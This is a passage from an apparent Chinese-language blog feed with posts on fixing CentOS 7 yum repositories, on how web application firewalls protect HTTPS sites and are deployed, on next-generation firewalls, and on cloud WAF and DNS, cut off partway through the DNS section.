class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash">[base]<br>name=CentOS-<span class="hljs-variable">$releasever</span> - Base<br><span class="hljs-comment">#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=os&amp;infra=$infra</span><br><span class="hljs-comment">#baseurl=http://mirror.centos.org/centos/$releasever/os/$basearch/</span><br><span class="hljs-comment">#baseurl=http://vault.centos.org/7.9.2009/x86_64/os/</span><br>baseurl=http://vault.centos.org/7.9.2009/os/<span class="hljs-variable">$basearch</span>/<br>gpgcheck=1<br>gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7<br> <br><span class="hljs-comment">#released updates </span><br>[updates]<br>name=CentOS-<span class="hljs-variable">$releasever</span> - Updates<br><span class="hljs-comment">#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=updates&amp;infra=$infra</span><br><span class="hljs-comment">#baseurl=http://mirror.centos.org/centos/$releasever/updates/$basearch/</span><br><span class="hljs-comment">#baseurl=http://vault.centos.org/7.9.2009/x86_64/os/</span><br>baseurl=http://vault.centos.org/7.9.2009/updates/<span class="hljs-variable">$basearch</span>/<br>gpgcheck=1<br>gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7<br> <br><span class="hljs-comment">#additional packages that may be useful</span><br>[extras]<br>name=CentOS-<span class="hljs-variable">$releasever</span> - Extras<br><span class="hljs-comment">#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=extras&amp;infra=$infra</span><br><span class="hljs-comment">#$baseurl=http://mirror.centos.org/centos/$releasever/extras/$basearch/</span><br><span class="hljs-comment">#baseurl=http://vault.centos.org/7.9.2009/x86_64/os/</span><br>baseurl=http://vault.centos.org/7.9.2009/extras/<span class="hljs-variable">$basearch</span>/<br>gpgcheck=1<br>gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7<br> <br><span class="hljs-comment">#additional packages that extend functionality of existing packages</span><br>[centosplus]<br>name=CentOS-<span class="hljs-variable">$releasever</span> - Plus<br><span class="hljs-comment">#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=centosplus&amp;infra=$infra</span><br><span class="hljs-comment">#baseurl=http://mirror.centos.org/centos/$releasever/centosplus/$basearch/</span><br><span class="hljs-comment">#baseurl=http://vault.centos.org/7.9.2009/x86_64/os/</span><br>baseurl=http://vault.centos.org/7.9.2009/centosplus/<span class="hljs-variable">$basearch</span>/<br>gpgcheck=1<br>enabled=0<br>gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7<br></code></pre></td></tr></table></figure><p>wq保存</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ada">sudo yum clean <span class="hljs-keyword">all</span><br>sudo yum makecache<br></code></pre></td></tr></table></figure><p>然后执行：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl -o <span class="hljs-regexp">/etc/yum</span>.repos.d<span class="hljs-regexp">/CentOS-Base.repo https:/</span><span class="hljs-regexp">/mirrors.aliyun.com/</span>repo/Centos-<span class="hljs-number">7</span>.repo<br></code></pre></td></tr></table></figure><p>然后执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> CentOS-Base.repo<br></code></pre></td></tr></table></figure><p>发现镜像改为阿里云即可</p><p>此后再执行安装雷池WAF的一句话命令发现不再报错。</p>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WAF如何防护HTTPS站点</title>
    <link href="/posts/a1c52770.html"/>
    <url>/posts/a1c52770.html</url>
    
    <content type="html"><![CDATA[<h1>WAF如何防护HTTPS站点</h1><p>WAF（Web应用防火墙）可以对HTTPS站点进行防护，主要通过以下几种方式：</p><p><strong>1. SSL代理</strong></p><p>WAF可以作为HTTPS站点的SSL代理，在客户端和服务器之间进行流量转发。WAF会对所有HTTPS流量进行解密，然后对解密后的明文报文进行安全分析，最后将报文重新加密并转发给服务器。通过这种方式，WAF可以检测和阻止各种针对HTTPS站点的攻击，例如SQL注入、跨站脚本攻击、XSS攻击等。</p><p><strong>2. 协议分析</strong></p><p>WAF可以对HTTPS协议进行分析，检测和阻止各种常见的攻击，例如HTTP协议报文头攻击、HTTP方法攻击、HTTP参数攻击等。</p><p><strong>3. 规则库</strong></p><p>WAF通常会内置丰富的规则库，可以根据已知的攻击特征对HTTPS流量进行检测和阻止。WAF还可以支持自定义规则，用户可以根据自身需求添加新的防护规则。</p><p><strong>4. 机器学习</strong></p><p>WAF可以利用机器学习技术，分析HTTPS流量的历史数据，学习攻击者的行为模式，并以此来识别和阻止新的攻击。</p><p><strong>5. 其他防护措施</strong></p><p>WAF还可以提供其他防护措施，例如：</p><ul><li>IP访问控制：可以根据IP地址限制对HTTPS站点的访问。</li><li>恶意IP库：可以将已知的恶意IP地址加入黑名单，阻止其访问HTTPS站点。</li><li>访问频率控制：可以限制对HTTPS站点的访问频率，防止DoS攻击。</li></ul><p><strong>HTTPS站点接入WAF的步骤</strong></p><ol><li>选择WAF服务商。</li><li>将HTTPS站点的域名或IP地址配置到WAF。</li><li>配置WAF的防护策略。</li><li>测试WAF的防护效果。</li></ol><p><strong>HTTPS站点接入WAF的注意事项</strong></p><ul><li>WAF会对HTTPS流量进行解密，因此需要确保WAF的安全性。</li><li>WAF的防护策略需要根据HTTPS站点的实际情况进行配置。</li><li>需要定期测试WAF的防护效果，确保其能够有效抵御攻击。</li></ul><h3 id="WAF如何做SSL代理进行流量转发"><a class="header-anchor" href="#WAF如何做SSL代理进行流量转发">¶</a>WAF如何做SSL代理进行流量转发</h3><p>WAF作为HTTPS站点的SSL代理进行流量转发，需要进行以下配置：</p><p><strong>1. 配置WAF的SSL代理功能</strong></p><ul><li>在WAF的配置界面，选择“SSL代理”功能。</li><li>配置WAF的SSL证书和密钥。</li><li>配置WAF的SSL协议版本和加密算法。</li></ul><p><strong>2. 配置HTTPS站点的SSL证书和密钥</strong></p><ul><li>在HTTPS站点的服务器上，生成SSL证书和密钥。</li><li>将SSL证书和密钥导入到WAF。</li></ul><p><strong>3. 配置HTTPS站点的DNS解析</strong></p><ul><li>将HTTPS站点的域名解析到WAF的IP地址。</li></ul><p><strong>4. 测试WAF的SSL代理功能</strong></p><ul><li>使用浏览器访问HTTPS站点，确保能够正常访问。</li><li>使用SSL测试工具测试WAF的SSL连接，确保其安全可靠。</li></ul><p><strong>WAF作为HTTPS站点的SSL代理进行流量转发的工作原理如下：</strong></p><ol><li>客户端浏览器访问HTTPS站点，向WAF发送HTTPS请求。</li><li>WAF收到HTTPS请求后，会对请求进行解密。</li><li>WAF对解密后的明文请求进行安全分析，检测和阻止各种攻击。</li><li>WAF将分析后的请求重新加密，并转发给HTTPS站点的服务器。</li><li>HTTPS站点的服务器收到请求后，进行处理并返回响应。</li><li>WAF对响应进行加密，并转发给客户端浏览器。</li><li>客户端浏览器收到响应后，进行解密并显示。</li></ol><p><strong>WAF作为HTTPS站点的SSL代理进行流量转发具有以下优势：</strong></p><ul><li>可以对HTTPS流量进行解密，从而进行更深入的安全分析。</li><li>可以检测和阻止各种针对HTTPS站点的攻击。</li><li>可以提高HTTPS站点的安全性。</li></ul><p><strong>WAF作为HTTPS站点的SSL代理进行流量转发也存在一些挑战：</strong></p><ul><li>需要对WAF进行安全配置，确保其自身安全。</li><li>需要对HTTPS站点的SSL证书和密钥进行妥善管理。</li><li>会对HTTPS站点的性能造成一定影响。</li></ul>]]></content>
    
    
    <categories>
      
      <category>web安全</category>
      
      <category>理论知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web安全</tag>
      
      <tag>理论知识</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WAF</title>
    <link href="/posts/e06f7bc6.html"/>
    <url>/posts/e06f7bc6.html</url>
    
    <content type="html"><![CDATA[<h1>WAF</h1><p>[TOC]</p><h2 id="1-什么是waf？"><a class="header-anchor" href="#1-什么是waf？">¶</a>1. 什么是waf？</h2><h4 id="概念"><a class="header-anchor" href="#概念">¶</a>概念:</h4><p><strong>WAF</strong>的全称是（Web Application Firewall）即<strong>Web应用防火墙</strong>，简称WAF。是一种用于保护Web应用程序的安全设备，Web应用程序是指通过Web浏览器或其他Web客户端访问的应用程序。WAF的目的是保护Web应用程序免受黑客、网络攻击和数据泄漏等安全威胁的攻击。</p><h4 id="特点："><a class="header-anchor" href="#特点：">¶</a>特点：</h4><p>**监测和拦截恶意流量：**WAF可以监测流经其设备的所有流量，对恶意流量进行拦截，保护Web应用程序免受各种攻击。</p><p>**基于规则的检测：**WAF通常采用基于规则的检测技术，通过预定义规则或自定义规则来检测并拦截恶意流量。</p><p>**防止漏洞利用：**WAF可以检测和拦截各种漏洞利用攻击，如SQL注入、XSS、CSRF、命令注入等。</p><p>**安全策略：**WAF可以通过安全策略来限制流量的来源、目标和类型，从而实现更精细的流量控制和访问控制。</p><p>**高可用性：**WAF通常具有高可用性，可以通过多节点部署和负载均衡来实现高可靠性和可扩展性。</p><h4 id="分类："><a class="header-anchor" href="#分类：">¶</a>分类：</h4><p>**硬件WAF：**硬件WAF通常是一种独立设备，它可以与网络交换机、路由器等设备集成，拦截来自外部网络的流量，并对Web应用程序进行保护。硬件WAF通常具有高性能和低延迟，适用于高流量的Web应用程序。</p><p>**软件WAF：**软件WAF通常是一种安装在服务器上的应用程序，可以通过修改Web服务器或代理服务器的配置文件实现。软件WAF可以与多种Web服务器和应用程序框架集成，包括Apache、Nginx、IIS等。软件WAF通常具有灵活性和易于配置的优点，适用于多种Web应用程序。</p><p>**云WAF：**云WAF通常是一种基于云的服务，可以将Web应用程序的流量转发到云端进行处理。云WAF可以提供全球分布的节点，从而提高Web应用程序的可用性和性能。云WAF通常具有弹性扩展、自动升级等优点，适用于高可用性和高性能的Web应用程序。</p><img src="/posts/e06f7bc6/image-20240326133155800.png" class title="image-20240326133155800"><h2 id="2-waf的工作原理"><a class="header-anchor" href="#2-waf的工作原理">¶</a>2. waf的工作原理</h2><p>WAF的<strong>工作原理</strong>通常包括以下几个步骤：</p><p><strong>流量识别</strong>：WAF识别来自客户端的请求，并对请求进行分析。WAF可以检查请求头、请求体、Cookie、URL参数等信息，并识别其中的攻击。</p><p><strong>攻击检测</strong>：WAF对识别的请求进行攻击检测。WAF可以使用多种技术来检测攻击，例如正则表达式、特征匹配、行为分析等。WAF可以检测多种攻击，包括SQL注入、XSS、CSRF、命令注入等。</p><p><strong>攻击响应</strong>：WAF根据检测结果采取相应的措施，例如拦截请求、阻止访问、记录事件等。WAF可以使用多种技术来响应攻击，例如重定向、报错、拦截等。</p><p><strong>日志记录</strong>：WAF记录所有请求和响应的详细信息，包括请求头、请求体、响应头、响应体等。WAF可以将日志发送给中央日志管理系统，以便进行分析和审计。</p><h2 id="waf和普通防火墙的区别"><a class="header-anchor" href="#waf和普通防火墙的区别">¶</a>waf和普通防火墙的区别</h2><p><strong>网络防火墙</strong>作为访问控制设备，主要工作在<strong>OSI模型三、四层（网络层和传输层）</strong>，基于IP报文进行检测。只是对端口做限制，对TCP协议做封堵。(只关注正向和反向流量的目的地址、源地址以及端口)其产品设计无需理解HTTP会话，也就决定了无法理解Web应用程序语言如HTML、SQL语言。因此，它不可能对HTTP通讯进行输入验证或攻击规则分析。针对Web网站的恶意攻击绝大部分都将封装为HTTP请求，从80或443端口顺利通过防火墙检测。</p><p>WAF能够过滤特定Web应用程序的内容，而常规防火墙则充当服务器之间的安全门。通过检查HTTP流量，它可以防止源自Web应用程序安全漏洞的攻击，例如SQL注入、跨站点脚本，文件包含和安全性错误配置。</p><h2 id="WAF的功能："><a class="header-anchor" href="#WAF的功能：">¶</a>WAF的功能：</h2><h4 id="通常传统waf的功能："><a class="header-anchor" href="#通常传统waf的功能：">¶</a>通常传统waf的功能：</h4><p>WAF主要是通过内置的很多安全规则 来进行防御。</p><p>可防护常见的SQL注入、XSS、网页篡改、中间件漏洞等OWASP TOP10攻击行。</p><p>当发现攻击后，可将IP进行锁定，IP锁定之后将无法访问网站业务。</p><p>也支持防止CC攻击，采用集中度和速率双重检测算法。</p><blockquote><p>CC攻击：通过大量请求对应用程序资源消耗最大的应用，如WEB查询数据库应用，从而导致服务器拒绝服务</p></blockquote><p><strong>WAF不能做什么？</strong></p><p>WAF不能做什么？</p><p>WAF不能过滤其他协议流量，如FTP、PoP3协议</p><p>WAF不能实现传统防护墙功能，如地址映射</p><p>WAF不能防止网络层的DDoS攻击</p><p>不能防病毒（NGFW可防）</p><h4 id="盛邦RAYwaf的功能"><a class="header-anchor" href="#盛邦RAYwaf的功能">¶</a>盛邦RAYwaf的功能</h4><p><strong>1.协议合规检测</strong></p><p>RayWAF 支持对 HTTP 协议包中各项参数，例如 URL 长度、Cookies 长度、请求行长度以及请求头长度等进行合规性控制，通过自定义阈值与参数访问控制相结合的方式，对 HTTP 数据进行第一层安全控制，从最开始杜绝非法数据包传输。</p><p><strong><a href="http://1.Web">1.Web</a> 攻击防护</strong></p><p>RayWAF 通过预置 Web 细粒度的防护特征库，可以有效的对 OWASP TOP10 攻击行为进行拦截，全面覆盖了 WEB 应用安全存在的主要威胁，并可根据特定的攻击字段自定义特征，通过匹配的方式对可能出现的攻击执行相应的处理。</p><p><strong><a href="http://2.Web">2.Web</a> 业务控制</strong></p><p>RayWAF 采用行为分析算法，针对访问行为分析，实现无特征行为的攻击防护，基于访问行为分析可以有效阻断此几类安全风险：爬虫，黑链，盗链，恶意文件的上传下载等行为</p><p><strong><a href="http://3.Web">3.Web</a> 敏感信息保护</strong></p><p>RayWAF 通过中件间信息保护、数据库信息保护、敏感文件保护、代码错误信息保护、隐私信息保护、敏感词防护等诸多敏感信息检测技术，防止敏感信息被泄露</p><p><strong><a href="http://4.Web">4.Web</a> 业务加固</strong></p><p>RayWAF 提供深入到具体应用业务内部的专项的加固保护能力，并为每种所支持的应用程序提供专门的检测防御模块，并综合提供暴力破解、弱密码检测、会话安全，CGI 防护，人机识别，访问顺序控制等多层面的多种检查、控制，从而保护业务的安全性。</p><p><strong>5.入侵检测防护</strong></p><p>RayWAF 通在核心技术平台上将引擎、协议分析和攻击检测分为三部分进行开发，然后再通过核心平台将它们的工作结合起来，这样可以避免由一个或两个规模很大的开发小组来维护整个检测语言系统的开发工作。另外，也增加了检测技术的适应性，可以共享各类事件库，从而能够更多的检测和防护各类攻击。另外，由于核心平台检测粒度非常精细，所以系统能够更加准确的判断网络工具行为。针对除应用层外的攻击进行全方位防护。</p><p><strong>6.DDos 攻击防护</strong></p><p>RayWAF 采用全新的数据采集模型，对经过流量进行分发调配，并配合多核处理架构合理利用系统资源，提升自身处理和清洗能力。同时，通过多样的DDoS 识别和二次验证算法，提升事件的检出能力和准确性</p><h2 id="WAF部署方式"><a class="header-anchor" href="#WAF部署方式">¶</a>WAF部署方式</h2><p><strong>串联：透明代理、透明流</strong></p><p><strong>并联：旁路反代（代理模式和牵引模式）、旁路检测、旁路镜像阻断</strong></p><h4 id="串联模式："><a class="header-anchor" href="#串联模式：">¶</a>串联模式：</h4><p><strong>透明代理：</strong></p><p>透明代理部署模式支持透明串接部署方式。串接在用户网络中，可实现即插即用，无需用户更改网络设备与服务器配置。部署简单易用，应用于大部分用户网络中。</p><img src="/posts/e06f7bc6/image-20240326155708773.png" class title="image-20240326155708773"><p>部署特点：</p><ol><li>不需要改变用户网络结构，对于用户而言是透明的</li><li>安全防护性能强</li><li>故障恢复快，可支持Bypass</li></ol><p><strong>透明流：</strong></p><p>透明桥模式是真正意义上的纯透明，不会改变更改数据包任何内容，比如源端口、TCP序列号，桥模式不跟踪TCP会话，可支持路由不对称环境。</p><img src="/posts/e06f7bc6/image-20240326155854698.png" class title="image-20240326155854698"><h4 id="并联模式："><a class="header-anchor" href="#并联模式：">¶</a>并联模式：</h4><p><strong>旁路反向代理（代理模式和牵引模式）</strong></p><p>​<strong>代理模式：</strong></p><img src="/posts/e06f7bc6/image-20240326161405972.png" class title="image-20240326161405972"><p>WAF采用反向代理模式以旁路的方式接入到网络环境中，需要更改网络防火墙的<strong>目的映射表</strong>，网络防火墙映射WAF的业务口地址，将服务器的IP地址进行隐藏。</p><p>部署特点：</p><ol><li>可旁路部署，对于用户网络不透明，防护能力强</li><li>故障恢复时间慢，不支持Bypass，恢复时需要重新将域名或地址映射到原服务器。</li><li>此模式应用于复杂环境中，如设备无法直接串接的环境。</li><li>访问时需要先访问WAF配置的业务口地址。</li><li>支持VRRP主备</li></ol><p>​<strong>牵引模式：</strong></p><img src="/posts/e06f7bc6/image-20240326161538046.png" class title="image-20240326161538046"><p>WAF采用反向代理模式以旁路的方式接入到网络环境中，需要在核心交换机上做策略路由PBR，将客户端访问服务器的流量牵引到WAF上，策略路由的下一跳地址为WAF的业务口地址。</p><p>部署特点:</p><ol><li>可旁路部署，对于用户网络不透明。</li><li>故障恢复时间慢，不支持Bypass，恢复时需要删除路由器策略路由配置。</li><li>此模式应用于复杂环境中，如设备无法直接串接的环境。</li><li>访问时仍访问网站服务器</li></ol><p><strong>旁路监控模式：</strong></p><p>采用旁路监听模式，在交换机做服务器端口镜像，将流量复制一份到WAF上，部署时不影响在线业务。在旁路模式下WAF只会进行<strong>告警而不阻断</strong>。</p><img src="/posts/e06f7bc6/image-20240326161741614.png" class title="image-20240326161741614"><p><strong>旁路镜像阻断模式:</strong></p><p>此拓扑适用于 WAF 旁路镜像阻断模式，WAF 旁路接入到交换机上，接收交换机传给 WAF 的镜像数据，对镜像数据进行分析，然后针对攻击行为进行<strong>构造阻断包</strong>，中断后续会话，进行攻击行为阻断。对存在的攻击以日志形式展示出来。拓扑如下:</p><img src="/posts/e06f7bc6/image-20240326161938306.png" class title="image-20240326161938306"><h2 id="云WAF的相关概念"><a class="header-anchor" href="#云WAF的相关概念">¶</a>云WAF的相关概念</h2><h2 id="软件waf、云waf和硬件waf的优缺点"><a class="header-anchor" href="#软件waf、云waf和硬件waf的优缺点">¶</a>软件waf、云waf和硬件waf的优缺点</h2><p><strong>硬件WAF的优点：</strong></p><ol><li>**性能强大：**硬件WAF通常是为专门的硬件设备设计的，具有强大的处理能力，能够处理高流量和大规模的网络应用程序流量。</li><li>**高度可定制化：**硬件WAF通常具有灵活的配置选项，可以根据具体需求进行高度定制，以适应各种应用程序的安全需求。</li><li>**低延迟：**由于硬件WAF是直接部署在网络基础设施上的，因此可以实现低延迟的攻击检测和防御。</li></ol><p><strong>硬件WAF的缺点：</strong></p><ol><li>**高成本：**硬件WAF通常需要昂贵的硬件设备来支持其功能，包括购买、部署和维护成本。</li><li>**部署复杂：**硬件WAF需要物理部署，可能需要对网络基础设施进行更改或调整，这可能需要较高的技术知识和专业人员来完成。</li><li>**扩展性有限：**硬件WAF的扩展性受到硬件设备的限制，如果需要增加容量或支持更多应用程序，可能需要购买新的硬件设备。</li></ol><p><strong>软件WAF的优点：</strong></p><ol><li>**灵活性：**软件WAF可以在通用服务器上运行，无需专用硬件设备，因此具有更大的灵活性和可移植性。</li><li>**成本效益：**相对于硬件WAF，软件WAF的成本较低，因为它可以在现有的服务器基础设施上运行。</li><li>**易于部署：**软件WAF可以通过软件安装和配置来实现，相对于物理部署要简单和快速。</li></ol><p><strong>软件WAF的缺点：</strong></p><ol><li>**性能受限：**软件WAF的性能可能受到运行它的服务器的资源限制，处理高流量和大规模应用程序流量时可能性能下降。</li><li>**系统依赖：**软件WAF可能依赖于特定的操作系统和软件环境，这可能限制其在不同平台上的可用性和兼容性。</li><li>**安全性风险：**由于软件WAF运行在服务器上，如果服务器本身存在漏洞或受到攻击，可能会导致软件WAF的绕过或失效。</li></ol><p><strong>云WAF的优点：</strong></p><ol><li>**可扩展性：**云WAF基于云服务提供商的基础设施，可以根据需要轻松地扩展容量和支持更多应用程序。</li><li>**管理简便：**云WAF通常提供易于使用的管理界面，可以实现快速配置和更新规则，而无需进行物理或软件部署。</li><li>**全球分发：**云WAF通常具有全球分布的能力，可以将应用程序流量路由到最近的数据中心，提高性能和用户体验。</li></ol><p><strong>云WAF的缺点：</strong></p><ol><li><p>**数据隐私：**网站访问数据对于一些企业、机构来说为保密数据，里面可能包含用户的隐私或者商业信息，这些数据自行管控会相对安全，但是如果使用Waf，所有的数据会记录到云端，这相当于数据被别人保管，可能存在一定的泄露风险</p></li><li><p>**存在轻易被绕过的风险：**云Waf的主要实现原理是通过将用户的DNS解析到云节点实现防护，这样一来，如果黑客通过相关手段获取了服务器的真实IP地址，然后强制解析域名，就可以轻松绕过云Waf对服务器发起攻击</p></li><li><p>**可靠性低：**云Waf处理一次请求，其中需要经过DNS解析、请求调度、流量过滤等环节，其中涉及协同关联工作，其中只要有一个环节出现问题，就会导致网站无法访问。必要时，只能手动切换为原DNS来保证业务正常运行，而域名解析需要一定时间，则会导致网站短时间无法正常访问</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>web安全</category>
      
      <category>理论知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web安全</tag>
      
      <tag>理论知识</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>下一代防火墙</title>
    <link href="/posts/7422e24d.html"/>
    <url>/posts/7422e24d.html</url>
    
    <content type="html"><![CDATA[<h1>下一代防火墙</h1><p>一、什么是下一代防火墙</p><p>下一代防火墙（NGFW）是一种深度检查防火墙，它包含了传统防火墙的所有功能，并增加了更先进的功能，以更好地防御网络威胁。NGFW不仅可以进行传统的<strong>包过滤</strong>，还可以进行<strong>深度包检查（DPI）</strong>，<strong>应用层防火墙</strong>和<strong>入侵防御系统（IDS）/入侵防御系统（IPS）</strong>。</p><p>这些新功能使得NGFW能够更好地理解和控制网络流量，因此能够更有效地防止恶意活动。例如，**NGFW可以识别和控制特定的应用程序，而不仅仅是基于端口和协议的访问控制。**此外，NGFW还可以使用用户身份信息，而不是只使用IP地址，从而提供更详细的访问控制。<br>二、下一代防火墙的主要功能</p><p>下一代防火墙（Next-Generation Firewall，NGFW）具有多种高级功能，以提供更全面的网络安全保护。</p><p>以下是一些常见的NGFW功能：</p><pre><code class="hljs">应用程序感知（Application Awareness）： NGFW能够识别和分类网络流量中的应用程序，而不仅仅是基于端口号或协议。这允许管理员更精细地控制对不同应用程序的访问，实施策略并监控应用程序使用情况。深度数据包检测（Deep Packet Inspection，DPI）： NGFW能够深入分析传输的数据包中的内容，包括消息负载和数据包中的各个层次。这有助于检测潜在的威胁、恶意代码和异常活动。入侵防御系统（Intrusion Prevention System，IPS）： NGFW集成了IPS功能，可监视网络流量以检测入侵尝试和恶意活动，并采取措施来阻止这些威胁。IPS可以根据已知的攻击签名和行为分析来识别和阻止攻击。外部威胁情报（External Threat Intelligence）： NGFW可以与外部威胁情报源集成，以获取有关已知威胁、恶意IP地址和恶意域名的信息。这有助于NGFW实施实时的威胁情报共享和阻止与这些威胁相关的流量。反病毒和反恶意软件保护： 一些NGFW还具备反病毒和反恶意软件功能，可以检测和阻止恶意文件和恶意软件的传播。沙箱分析（Sandbox Analysis）： 一些NGFW集成了沙箱技术，用于隔离和分析潜在恶意文件或程序的行为。这有助于检测未知威胁和零日漏洞利用。Web代理和URL检查： NGFW可以对访问的网站和URL进行检查，以阻止访问恶意或不安全的网站，并过滤不当的内容。虚拟专用网络（VPN）支持： NGFW通常支持安全的VPN连接，以加密远程访问和站点之间的通信。</code></pre><p>这些功能使得下一代防火墙成为企业网络安全的关键组成部分，可以帮助防范各种网络威胁，保护敏感数据，并提供高级的网络安全控制和监控。<br>三、下一代防火墙的优势</p><ol><li>更高的安全性</li></ol><p>由于NGFW可以进行深度包检查，识别应用程序和用户，以及集成入侵防御系统，所以它的安全性要高于传统防火墙。<br>2. 更好的可见性和控制</p><p>NGFW提供了对网络流量的深入理解，使网络管理员能够更好地控制网络流量，并对网络行为有更深入的理解。<br>3. 简化的网络安全管理</p><p>由于NGFW将多种安全功能集成在一起，所以它可以简化网络安全管理。网络管理员不再需要管理和配置多个单独的安全设备。<br>四、下一代防火墙 vs 传统防火墙</p><p>下一代防火墙（NGFW）通常在现代网络安全环境中胜出，因为它们提供了比传统防火墙更多的高级功能和安全性控制。</p><p>以下是NGFW与传统防火墙之间的一些关键区别和优势：</p><pre><code class="hljs">功能性扩展： NGFW不仅具备传统防火墙的基本功能，如网络地址转换（NAT）、端口地址转换（PAT）和虚拟专用网络（VPN），还提供了更广泛的功能，如应用程序层检测、深度包检测、入侵防御系统（IPS）等。这些功能增加了对网络流量的深层次分析和更高级的安全策略实施能力。应用层意识： NGFW能够识别和控制网络流量中的应用程序，而不仅仅是基于端口号或协议的规则。这使得管理员可以更精细地控制访问，并实施基于应用程序的策略，提高了网络安全性。完整的安全技术包： NGFW通常集成了多种安全技术，包括防病毒、反恶意软件、沙箱分析等，使其能够检测和阻止各种网络威胁，包括已知和未知的威胁。外部威胁情报： NGFW可以与外部威胁情报源集成，以获取有关已知威胁和恶意IP地址的信息。这增强了NGFW的威胁检测和阻止能力。价格效益： 虽然NGFW可能会在初期投资上略高于传统防火墙，但考虑到其集成的多种功能和更全面的安全性，它们通常被认为是更具成本效益的选择。NGFW减少了单独管理多个安全工具的成本。虽然传统防火墙在某些情况下仍然有用，但在面对不断演化的网络威胁和复杂性的情况下，大多数组织更倾向于选择NGFW。NGFW提供了更高级的安全性、更精细的控制和更全面的功能，以帮助企业更好地应对当前的网络安全挑战。</code></pre>]]></content>
    
    
    <categories>
      
      <category>理论知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>理论知识</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>云WAF以及与云WAF相关内容</title>
    <link href="/posts/5e6d38ee.html"/>
    <url>/posts/5e6d38ee.html</url>
    
    <content type="html"><![CDATA[<h1>云WAF以及与云WAF相关内容</h1><h3 id="云计算："><a class="header-anchor" href="#云计算：">¶</a>云计算：</h3><p>目前我们说的云计算指的是<strong>云计算服务</strong>。云是一个地理概念，指的是<strong>计算在云端发生</strong>，云计算服务是厂商把自己的数据资源中心按需租用给客户，协助他在云端进行计算处理的服务。</p><p>**优点：**灵活的订阅机制；弹性的按需付费；有别与本地化部署，部署和运维成本很低，部署简单，可弹性购买服务，安全性很高，厂商会提供标准化的安全检查和安全服务。</p><p>云服务模式：</p><p><strong>SaaS</strong>：将软件作为服务卖给客户</p><p><strong>PaaS</strong>：将平台作为服务卖给客户</p><p><strong>LaaS</strong>：将基础设施作为服务卖给客户</p><h3 id="硬件防火墙："><a class="header-anchor" href="#硬件防火墙：">¶</a>硬件防火墙：</h3><p>部署方式：一个独立的硬件盒子串行部署在web服务器前，串接在交换机上。</p><p><strong>优点</strong>：部署简单，可承受吞吐量大。</p><p><strong>缺点</strong>：贵，离线部署不能实时更新规则</p><h3 id="软件防火墙："><a class="header-anchor" href="#软件防火墙：">¶</a>软件防火墙：</h3><p>以软件形式直接安装在服务器上，典型的是网站安全狗</p><p><strong>优点</strong>：安装简单，下载即用，部分开源免费</p><p><strong>缺点</strong>：耗费服务器资源，而且只能单台机器部署，不适合大型项目</p><h3 id="云WAF："><a class="header-anchor" href="#云WAF：">¶</a>云WAF：</h3><p>​无需软硬件部署，利用DNS技术，通过<strong>移交域名解析权</strong>来实现安全防护。用户的请求首先发送到<strong>云端节点</strong>进行检测，如存在异常请求则进行拦截，否则将请求<strong>转发</strong>至真实服务器。通常情况下，云WAF系统由<strong>控制中心</strong>及<strong>端节点</strong>两大部分组成。控制中心部署有DNS服务器、调度系统等，用来解析并调度客户端对网站的访问请求。端节点采用多台分布式部署，每一个端节点都是一台独立的硬件WAF设备，用来过滤非法的网站请求。</p><p><strong>优点：</strong></p><ul><li><p>部署更加简单；</p></li><li><p>网站本身不会增加运维成本；</p></li><li><p>云waf厂商会及时跟踪最新漏洞；</p></li><li><p>添加规则实现对最新Web攻击的防护；</p></li><li><p>云waf一般采用<strong>多节点部署</strong>方式，具有CDN功能，可提高用户访问速度。</p></li><li><p>云WAF的<strong>主要功能</strong>有DDOS&amp;CC防护、应用安全防护、业务安全防护、CDN加速、联动防御、态势感知、虚拟补丁、精准访问控制、0day漏洞快速修复等。</p></li></ul><p><strong>缺点：</strong></p><ul><li>如果知道Web应用的真实IP可以直接绕过云waf；</li><li>对于某些大型企业或厂商存在安全问题，通常他们会采取私有云或者混合云的方式解决</li></ul><h2 id="利用DNS引流"><a class="header-anchor" href="#利用DNS引流">¶</a>利用DNS引流</h2><h3 id="DNS："><a class="header-anchor" href="#DNS：">¶</a>DNS：</h3><p>DNS( Domain Name System)是“域名系统”的英文缩写，是一种组织成域层次结构的计算机和网络服务命名系统，使用的是UDP协议的53号端口，它用于TCP/IP网络，它所提供的服务是用来<strong>将主机名和域名转换为IP地址的工作。</strong></p><h4 id="DNS记录："><a class="header-anchor" 